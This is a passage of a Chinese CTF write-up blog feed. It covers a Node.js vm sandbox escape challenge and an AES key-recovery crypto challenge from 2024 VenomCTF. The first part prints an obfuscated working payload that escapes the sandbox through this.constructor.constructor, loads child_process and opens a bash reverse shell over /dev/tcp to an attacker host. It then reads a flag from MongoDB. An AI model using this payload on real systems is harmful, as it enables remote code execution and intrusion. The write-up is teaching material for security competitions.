keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>code<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">error</span><span class=\"token operator\">:</span> <span class=\"token string\">'Code is required.'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isValidCode</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token keyword\">const</span> sandbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token keyword\">const</span> script <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">vm<span class=\"token punctuation\">.</span>Script</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> script<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span>sandbox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> result <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">error</span><span class=\"token operator\">:</span> err<span class=\"token punctuation\">.</span>message <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">error</span><span class=\"token operator\">:</span> <span class=\"token string\">'you cant bypass my vm best waf!'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">//app.get('/getflag', function (req, res) &#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">//    todo...</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">//&#125;);</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span><span class=\"token number\">3000</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">nodeapp listening on http://localhost:3000</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>审计源码，有长度限制和非法字符过滤，最后利用 <code>runInNewContext</code>  执行</p>\n<p><strong>反弹 shell payload</strong></p>\n<p><strong>Node RCE 方式</strong>：<em>获取 process 对象后，用 require 导入 child_process，再利用 child_process 执行命令，process 挂载在 global 上</em></p>\n<p><code>fromCharCode</code>  减少 payload 长度，利用  <code>this.constructor.constructor</code>  进行沙箱逃逸，利用 <code>with</code>  绕过对 <code>.</code>  的过滤</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>f<span class=\"token operator\">=</span>fromCharCode<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>constructor<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span><span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">=</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span>e<span class=\"token operator\">=</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span>t<span class=\"token operator\">=</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">117</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">110</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">=</span><span class=\"token number\">112</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>c<span class=\"token operator\">=</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>s<span class=\"token operator\">=</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>mainModule<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>h<span class=\"token operator\">=</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span><span class=\"token number\">105</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token number\">95</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>h<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>h<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">105</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span><span class=\"token number\">118</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>with(String)</code> : 创建一个作用域，可直接引用 JavaScript 内置的 String 对象的方法和属性。</p>\n<p><code>String.fromCharCode</code>  把指定的 Unicode 值转换成字符串，使用数字代替字符 payload 长度会更短， <code>节省空间/代码混淆</code></p>\n<p>定义函数 f <code>f=fromCharCode</code></p>\n<p><code>with(constructor('return process')</code> : 调用  <code>fromCharCode</code>  方法生成了一串字符，并将其作为参数传递给  <code>constructor</code> ，创建了一个新的对象。</p>\n<p><code>with(mainModule)</code> :  <code>mainModule</code>  对象引入作用域，是一个特殊对象，代表当前运行的主模块</p>\n<p><code>with(require('child_process'))</code> :  引入模块 <code>child_process</code></p>\n<p><code>exec(bash -c &quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;b&quot;)</code> ： <code>0&gt;&amp;b</code>  防止与其他正在运行的命令产生冲突</p>\n<p>将 <code>/ip/port</code>  部分进行 <code>ascii 10进制编码</code> 后，连接服务器端口 ssh</p>\n<p>payload 中 <code>0&gt;&amp;1</code>  要根据混淆的表达定义进行重构，比如此处 <code>ord(1)=49即为a</code></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>f<span class=\"token operator\">=</span>fromCharCode<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>constructor<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span><span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">=</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span>e<span class=\"token operator\">=</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span>t<span class=\"token operator\">=</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">117</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">110</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">=</span><span class=\"token number\">112</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>c<span class=\"token operator\">=</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>s<span class=\"token operator\">=</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>mainModule<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>h<span class=\"token operator\">=</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span><span class=\"token number\">105</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token number\">95</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>h<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>h<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">105</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span><span class=\"token number\">118</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span>a<span class=\"token operator\">=</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">51</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>以 MongoDB 为突破口，查看信息</p>\n<p><code>mongo</code>  连接 MongoDB 数据库服务器，执行操作</p>\n<p><code>show databases</code>  列出当前 MongoDB 服务器上所有的数据库</p>\n<p><code>use secret</code>  告诉 MongoDB 客户端要使用的数据库是 &quot;secret&quot;</p>\n<p><code>show tables / show collections</code>  列出当前数据库中的所有集合</p>\n<p><code>db.flag.find()</code>  在 &quot;flag&quot; 集合中查找所有文档</p>\n<p>找到 <code>flag&#123;df184567-15cd-4876-b283-256ccc9161de&#125;</code></p>\n",
            "tags": [
                "CTF赛题",
                "CTF_WriteUp"
            ]
        },
        {
            "id": "http://yoursite.com/CTF-WriteUp/2024%20VenomCTF/",
            "url": "http://yoursite.com/CTF-WriteUp/2024%20VenomCTF/",
            "title": "2024 VenomCTF",
            "date_published": "2024-03-18T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h2 id=\"狂飙\"><a class=\"anchor\" href=\"#狂飙\">#</a> 狂飙</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>key <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>key <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n<span class=\"token operator\">=</span>m <span class=\"token operator\">%</span> key</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># n=>key</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">%</span> key <span class=\"token operator\">=</span> n</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>iv <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 8byte 异或</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#103560843006078708944833658339172896192389513625588</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#b'\\xfc\\x87\\xcb\\x8e\\x9d\\x1a\\x17\\x86\\xd9~\\x16)\\xbfU\\x98D\\xfe\\x8f\\xde\\x9c\\xb0\\xd1\\x9e\\xe7\\xa7\\xefiY\\x95C\\x14\\x13C@j1\\x9d\\x08\\xd9\\xe7W>F2\\x96cm\\xeb'</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#b'UN\\x1d\\xe2r&lt;\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86'</span></pre></td></tr></table></figure><p><strong>AES 解密</strong>：创建 AES 解密器，调用 <code>decrypt</code>  方法</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>aes_dec <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dec <span class=\"token operator\">=</span> aes_dec<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>补充</strong>：os.urandom () 函数生成的字节串是不可打印的，只能用于加密、哈希、签名等应用。在使用 os.urandom () 函数生成随机数时，可以将生成的字节串转换为整数，然后根据需要进行取模等操作。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>iv <span class=\"token operator\">=</span> <span class=\"token string\">b'UN\\x1d\\xe2r&lt;\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># print(iv)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>max_num <span class=\"token operator\">=</span> <span class=\"token number\">100</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>rand_int <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">.</span>from_bytes<span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">,</span> byteorder<span class=\"token operator\">=</span><span class=\"token string\">'big'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> max_num <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rand_int<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>言归正传，这道题 <code>已知iv,cipher</code> ，所以解密 <code>关键在key</code></p>\n<ul>\n<li>key 是 24 位随机数</li>\n<li><code>n=m % key</code></li>\n<li>已知 m,n</li>\n</ul>\n<p><strong>思路</strong>：key 是 m-n 的一个因子，通过大素数分解可以求得所有可能 http://www.factordb.com/index.php</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">8800751370.</span><span class=\"token punctuation\">.</span><span class=\"token number\">.61</span><span class=\"token operator\">&lt;</span><span class=\"token number\">77</span><span class=\"token operator\">></span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span> · <span class=\"token number\">37</span> · <span class=\"token number\">439</span> · <span class=\"token number\">3939851</span> · <span class=\"token number\">265898280367</span><span class=\"token operator\">&lt;</span><span class=\"token number\">12</span><span class=\"token operator\">></span> · <span class=\"token number\">5036645362649</span><span class=\"token operator\">&lt;</span><span class=\"token number\">13</span><span class=\"token operator\">></span> · <span class=\"token number\">342291058100503482469327892079792475478873</span><span class=\"token operator\">&lt;</span><span class=\"token number\">42</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>通过 <code>combinations</code>  得到 <code>因子组合成key的所有可能</code> ，再逐个尝试解密</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> combinations</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">103560843006078708944833658339172896192389513625588</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> <span class=\"token string\">b'\\xfc\\x87\\xcb\\x8e\\x9d\\x1a\\x17\\x86\\xd9~\\x16)\\xbfU\\x98D\\xfe\\x8f\\xde\\x9c\\xb0\\xd1\\x9e\\xe7\\xa7\\xefiY\\x95C\\x14\\x13C@j1\\x9d\\x08\\xd9\\xe7W>F2\\x96cm\\xeb'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>iv <span class=\"token operator\">=</span> <span class=\"token string\">b'UN\\x1d\\xe2r&lt;\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>factor <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">439</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3939851</span><span 